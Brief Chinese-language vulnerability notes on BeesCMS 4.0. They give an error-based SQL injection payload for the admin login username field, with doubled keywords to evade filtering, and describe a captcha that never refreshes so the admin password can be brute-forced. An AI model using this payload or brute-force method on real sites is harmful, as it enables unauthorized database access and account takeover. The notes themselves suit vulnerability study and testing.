### beescms

```
版本信息：4.0
```

#### sql注入

后台登录处，在用户名后加单引号发现报错

```
admin' a and nd extractvalue(1,concat(0x7e,(select database()),0x7e))#
```

![Snipaste_2022-10-31_17-03-20.jpg](images/Snipaste_2022-10-31_17-03-20.jpg)

#### 后台验证码不刷新

输入一次正确的验证码然后抓包，可以发现多次改变密码都是提示密码错误

![Snipaste_2022-10-31_17-06-23.jpg](images/Snipaste_2022-10-31_17-06-23.jpg)

对密码进行爆破

![Snipaste_2022-10-31_17-08-20.jpg](images/Snipaste_2022-10-31_17-08-20.jpg)